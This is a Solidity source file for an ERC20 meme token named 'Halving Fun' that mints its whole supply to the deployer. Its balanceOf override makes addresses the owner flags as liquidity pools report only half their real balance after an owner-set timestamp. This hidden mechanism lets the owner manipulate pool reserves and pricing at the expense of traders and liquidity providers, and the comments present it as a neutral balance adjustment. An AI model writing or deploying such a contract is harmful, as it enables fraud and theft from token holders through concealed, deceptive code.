// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

/**
 * @title Halving Fun (HALVIFU)
 * @dev An ERC20 token that conditionally adjusts the balance of certain addresses,
 * with an initial supply of 100 billion tokens minted to the deployer.
 * Inherits OpenZeppelin's ERC20 and Ownable for standard token functionality and ownership management.
 */
contract HalvingFun is ERC20, Ownable {
    uint256 public halvingTimestamp;
    mapping(address => bool) public isLPaddress;

    uint256 constant initialSupply = 1e11 * 1e18; // 100 billion tokens with 18 decimal places

    constructor() ERC20("Halving Fun", "HALVIFU") {
        _mint(msg.sender, initialSupply); // Mint the initial supply to the deployer
        halvingTimestamp = 1713602649; // 
    }

    // Overrides the balanceOf function to conditionally adjust balances
    function balanceOf(address account) public view override returns (uint256) {
        uint256 originalBalance = super.balanceOf(account);
        if (block.timestamp > halvingTimestamp && isLPaddress[account]) {
            return originalBalance / 2; // Halves the balance for LP addresses after the halving timestamp
        }
        return originalBalance;
    }

    // Administrative function to set the halving timestamp
    function setHalvingTimestamp(uint256 _halvingTimestamp) public onlyOwner {
        require(_halvingTimestamp > block.timestamp, "Halving timestamp must be in the future.");
        halvingTimestamp = _halvingTimestamp;
    }

    // Allows the owner to mark an address as an LP address
    function addLPAddress(address _LPaddress) public onlyOwner {
        require(_LPaddress != address(0), "LP address cannot be the zero address.");
        isLPaddress[_LPaddress] = true;
    }

    // Allows the owner to unmark an LP address
    function removeLPAddress(address _LPaddress) public onlyOwner {
        isLPaddress[_LPaddress] = false;
    }
}